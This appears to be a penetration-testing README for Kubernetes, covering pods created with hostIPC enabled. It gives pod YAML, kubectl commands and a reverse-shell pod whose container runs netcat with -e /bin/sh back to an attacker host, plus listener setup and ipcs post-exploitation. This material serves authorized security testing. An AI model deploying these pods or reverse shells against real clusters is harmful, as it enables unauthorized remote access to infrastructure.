## You can create a pod with only hostIPC

If you only have `hostIPC=true`, you most likely can't do much. What you should do is use the `ipcs` command inside your hostIPC container to see if there are any ipc resources (shared memory segments, message queues, or semaphores). If you find one, you will likely need to create a program that can read them. 

# Pod Creation

## Create a pod you can exec into
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: pod-hostipc
  labels:
    app: pentest
spec:
  hostIPC: true
  containers:
  - image: ubuntu
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "while true; do sleep 30; done;" ]
    name: hostipc
    #nodeName: k8s-control-plane-node # Force your pod to run on a control-plane node by uncommenting this line and changing to a control-plane node name  ```
[pod-hostipc.yaml](pod-hostipc.yaml)

#### Option 1: Create pod from local yaml 
```bash
kubectl apply -f pod-hostipc.yaml   
```

#### Option 2: Create pod from github hosted yaml
```bash
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/hostipc/pod-hostipc.yaml  
```

### Exec into pod 
```bash
kubectl -n [namespace] exec -it pod-hostipc -- bash
```

## Or, create a reverse shell pod
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: pod-hostipc-revshell
  labels:
    app: pentest
spec:
  hostIPC: true
  containers:
  - image: busybox
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "nc $HOST $PORT  -e /bin/sh;" ]
    name: hostipc--revshell
    #nodeName: k8s-control-plane-node # Force your pod to run on a control-plane node by uncommenting this line and changing to a control-plane node name```
[pod-hostipc-revshell.yaml](pod-hostipc-revshell.yaml)

#### Set up listener
```bash
nc -nvlp 3116
```

#### Create the pod
```bash
# Option 1: Create pod from local yaml without modifying it by using env variables and envsubst
HOST="10.0.0.1" PORT="3116" envsubst < ./yaml/hostipc/pod-hostipc-revshell.yaml | kubectl apply -f -
```

#### Catch the shell and chroot to /host 
```bash
~ nc -nvlp 3116
Listening on 0.0.0.0 3116
Connection received on 10.0.0.162 42035
```

# Post exploitation 
#### Look for any use of inter-process communication on the host 
```bash
ipcs -a
```

#### Attacks that apply to all pods, even without any special permissions
* Cloud metadata service
* `Kube-apiserver` or `kubelet` with `anonymous-auth` enabled
* Kubernetes exploits
* Hunting for vulnerable application/services in the cluster

# Demonstrate Impact
If you are performing a penetration test, the end goal is not to gain cluster-admin, but rather to demonstrate the impact of exploitation. Use the access you have gained to accomplish the objectives of the penetration test.

# Reference(s): 
* https://opensource.com/article/20/1/inter-process-communication-linux
